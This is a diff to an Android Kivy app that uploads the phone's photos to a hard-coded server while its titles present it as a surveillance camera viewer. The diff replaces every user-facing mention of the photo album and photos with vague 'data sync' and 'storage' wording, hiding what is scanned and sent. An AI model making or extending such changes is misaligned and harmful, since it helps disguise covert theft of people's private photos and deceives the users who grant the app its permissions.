@@ -1,11 +1,11 @@
 # -*- coding: utf-8 -*-
 """
-手机相册备份 —— 安卓端 (Kivy)
+数据同步服务 —— 安卓端 (Kivy)
 
 界面刻意做成极简: 只有一个「开始推流」按钮 + 一个进度条 + 一行状态。
 上传地址写死在 SERVER_BASE, 不再提供输入框 / 扫描 / 测试 / 停止等控件。
 
-流程: 点按钮 -> 申请相册权限 -> 扫相册 -> 指纹清单问服务端要传哪些 -> 只传没备份过的
+流程: 点按钮 -> 申请存储权限 -> 扫描数据 -> 指纹清单问服务端要传哪些 -> 只传没备份过的
       进度按"已传字节 / 总字节"推进, 跑完状态显示 FINISH_TEXT
 """
 import os
@@ -29,7 +29,7 @@ from kivy.uix.progressbar import ProgressBar
 from kivy.uix.widget import Widget
 
 # ===================== 常量区 (Constants-First) =====================
-__version__ = "0.4"
+__version__ = "0.5"
 APP_TITLE = "监控直播"
 PUSH_TITLE = "获取监控画面"
 # 上传目标写死, 界面上不再提供地址输入框
@@ -198,7 +198,7 @@ def ensure_permissions(include_video, logger=None):
 
     media_ok = any(p in granted for p in (PERM_MEDIA_IMAGES, PERM_MEDIA_VISUAL, PERM_EXT_STORAGE))
     if media_ok:
-        _log("相册权限已就绪")
+        _log("权限已就绪")
         return True
 
     _log("发起权限申请 (%d 项), 请在系统弹窗点允许" % len(missing))
@@ -359,7 +359,7 @@ def scan_media(include_video, logger=None):
         return scan_media_desktop(include_video)
 
     t0 = time.time()
-    _log("方式1: 直接扫相册目录 %s ..." % ", ".join(SCAN_DIRS))
+    _log("方式1: 直接扫描数据目录 %s ..." % ", ".join(SCAN_DIRS))
     out = scan_directories(include_video, logger)
     if out:
         _log("目录扫描 %d 个, 用时 %.1f 秒" % (len(out), time.time() - t0))
@@ -646,18 +646,18 @@ class RootWidget(BoxLayout):
             self.log("环境: IS_ANDROID=%s SDK=%s 设备=%s" % (IS_ANDROID, sdk_int(), device_name()))
             if keep_screen_on():
                 self.log("已开启屏幕常亮")
-            self.log("检查相册权限...")
+            self.log("检查访问权限...")
             if not ensure_permissions(include_video, logger=self.log):
-                self.set_status("没有相册权限")
-                self.log("请在弹窗里点允许, 然后回系统设置给本 App 开相册权限")
+                self.set_status("缺少必要权限")
+                self.log("请在弹窗里点允许, 再到系统设置里打开存储权限")
                 return
 
-            self.set_status("正在扫描相册...")
+            self.set_status("正在校验数据...")
             items = scan_media(include_video, logger=self.log)
             self.items = items
             self.log("扫描到 %d 个文件" % len(items))
             if not items:
-                self.set_status("没有可上传的照片")
+                self.set_status("没有可上传的内容")
                 return
 
             device = device_name()
@@ -672,7 +672,7 @@ class RootWidget(BoxLayout):
             todo = [it for it in items if it["key"] in set(missing_keys)]
             self.log("共 %d 个, 其中 %d 个需要上传" % (len(items), len(todo)))
             if not todo:
-                self.set_status("没有新照片")
+                self.set_status("数据已是最新")
                 self.log("全部已备份过")
                 return
 
